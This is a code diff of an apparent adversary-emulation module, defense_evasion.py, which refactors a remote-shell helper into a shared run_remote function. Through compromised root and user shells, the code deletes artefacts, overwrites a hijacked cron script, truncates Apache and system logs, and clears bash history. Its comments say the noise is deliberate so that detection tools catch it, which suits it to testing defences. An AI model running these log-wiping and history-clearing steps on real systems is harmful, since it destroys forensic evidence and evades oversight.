@@ -2,7 +2,7 @@ import re
 import socket
 import time
 
-from chainlog import log
+from chainlog import log, run_remote
 
 # =============================================================================
 # defense_evasion.py — Messy and Loud Defense Evasion
@@ -52,53 +52,6 @@ _WORKSTATION_TMP_ARTIFACTS = [
 CRON_SCRIPT   = "/opt/cleanup.sh"
 APACHE_LOGDIR = "/usr/local/apache2/logs"
 
-_sentinel_seq = 0
-
-
-# ---------------------------------------------------------------------------
-# Shell helpers (same sentinel pattern used across all chain modules)
-# ---------------------------------------------------------------------------
-
-def _drain(shell):
-    prev = shell.gettimeout()
-    shell.settimeout(0.1)
-    while True:
-        try:
-            if not shell.recv(4096):
-                break
-        except socket.timeout:
-            break
-    shell.settimeout(prev)
-
-
-def _run_remote(shell, cmd, timeout=10):
-    global _sentinel_seq
-    _sentinel_seq += 1
-    sentinel = f"DE_SENTINEL_{_sentinel_seq:04X}_END"
-
-    _drain(shell)
-    shell.sendall(f"{cmd}\n".encode())
-    time.sleep(0.4)
-    shell.sendall(f"echo {sentinel}\n".encode())
-
-    prev = shell.gettimeout()
-    shell.settimeout(2)
-    buf = ""
-    deadline = time.time() + timeout
-    while time.time() < deadline:
-        try:
-            buf += shell.recv(4096).decode(errors="replace")
-        except socket.timeout:
-            pass
-        if sentinel in buf:
-            break
-    shell.settimeout(prev)
-
-    if sentinel in buf:
-        buf = buf[: buf.index(sentinel)]
-    buf = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", buf)
-    return buf.replace("\r", "").strip()
-
 
 # ---------------------------------------------------------------------------
 # Apache cleanup phases (as root)
@@ -113,7 +66,7 @@ def _apache_delete_artifacts(root_shell):
     log("[*] Removing /tmp artefacts from apache ...")
     for path in _APACHE_TMP_ARTIFACTS:
         # No -f: missing-file errors are the point — they show up in history.
-        out = _run_remote(root_shell, f"rm {path} 2>&1 || true")
+        out = run_remote(root_shell, f"rm {path} 2>&1 || true", timeout=10)
         if "No such file" in out or "cannot remove" in out:
             log(f"[-] {path}: already gone — rm error left in history")
         else:
@@ -129,12 +82,13 @@ def _apache_sanitise_cron_script(root_shell):
     change is detectable by FIM or a simple diff against source control.
     """
     log(f"[*] Overwriting hijacked cron script {CRON_SCRIPT} with stub ...")
-    out = _run_remote(
+    out = run_remote(
         root_shell,
         f"echo '#!/bin/bash' > {CRON_SCRIPT} "
         f"&& echo '# maintenance placeholder' >> {CRON_SCRIPT} "
         f"&& echo 'exit 0' >> {CRON_SCRIPT} "
         f"&& echo CRON_OK || echo CRON_FAIL",
+        timeout=10,
     )
     if "CRON_OK" in out:
         log(
@@ -153,16 +107,17 @@ def _apache_truncate_logs(root_shell):
     Any FIM watcher records the inode mtime change even on an empty file.
     """
     log(f"[*] Truncating apache logs in {APACHE_LOGDIR} ...")
-    listing = _run_remote(
+    listing = run_remote(
         root_shell,
         f"find {APACHE_LOGDIR} -maxdepth 1 -type f -name '*.log' 2>/dev/null",
+        timeout=10,
     )
     log_files = [l.strip() for l in listing.splitlines() if l.strip()]
     if not log_files:
         log(f"[-] No *.log files found in {APACHE_LOGDIR}")
         return
     for log_file in log_files:
-        out = _run_remote(root_shell, f"> {log_file} && echo TRUNC_OK || echo TRUNC_FAIL")
+        out = run_remote(root_shell, f"> {log_file} && echo TRUNC_OK || echo TRUNC_FAIL", timeout=10)
         if "TRUNC_OK" in out:
             log(f"[+] {log_file}: truncated (FIM records mtime change; Docker logs already captured)")
         else:
@@ -176,10 +131,11 @@ def _apache_clear_history(root_shell):
     HISTFILE is truncated, so they remain visible until the shell exits.
     """
     log("[*] Clearing bash history on apache (root) ...")
-    _run_remote(root_shell, "history -c")
-    out = _run_remote(
+    run_remote(root_shell, "history -c", timeout=10)
+    out = run_remote(
         root_shell,
         "cat /dev/null > ~/.bash_history && echo HIST_OK || echo HIST_FAIL",
+        timeout=10,
     )
     if "HIST_OK" in out:
         log("[+] ~/.bash_history: truncated (clear commands already in session buffer)")
@@ -199,7 +155,7 @@ def _workstation_delete_artifacts(john_shell):
     """
     log("[*] Removing /tmp artefacts from workstation ...")
     for path in _WORKSTATION_TMP_ARTIFACTS:
-        out = _run_remote(john_shell, f"rm {path} 2>&1 || true")
+        out = run_remote(john_shell, f"rm {path} 2>&1 || true", timeout=10)
         if "No such file" in out or "cannot remove" in out:
             log(f"[-] {path}: already gone — rm error left in history")
         else:
@@ -221,9 +177,10 @@ def _workstation_attempt_log_wipe(john_shell):
     """
     log("[*] Attempting to truncate system logs (expect permission denied) ...")
     for log_path in ("/var/log/auth.log", "/var/log/syslog"):
-        out = _run_remote(
+        out = run_remote(
             john_shell,
             f"if : > {log_path} 2>/dev/null; then echo WIPE_OK; else echo WIPE_DENIED; fi",
+            timeout=10,
         )
         if "WIPE_DENIED" in out:
             log(f"[-] {log_path}: permission denied — failed attempt is itself detectable")
@@ -236,10 +193,11 @@ def _workstation_attempt_log_wipe(john_shell):
 def _workstation_clear_history(john_shell):
     """Clear john.stravidis's bash history (T1070.003)."""
     log("[*] Clearing bash history on workstation (john.stravidis) ...")
-    _run_remote(john_shell, "history -c")
-    out = _run_remote(
+    run_remote(john_shell, "history -c", timeout=10)
+    out = run_remote(
         john_shell,
         "cat /dev/null > ~/.bash_history && echo HIST_OK || echo HIST_FAIL",
+        timeout=10,
     )
     if "HIST_OK" in out:
         log("[+] ~/.bash_history: truncated (clear commands already in session buffer)")
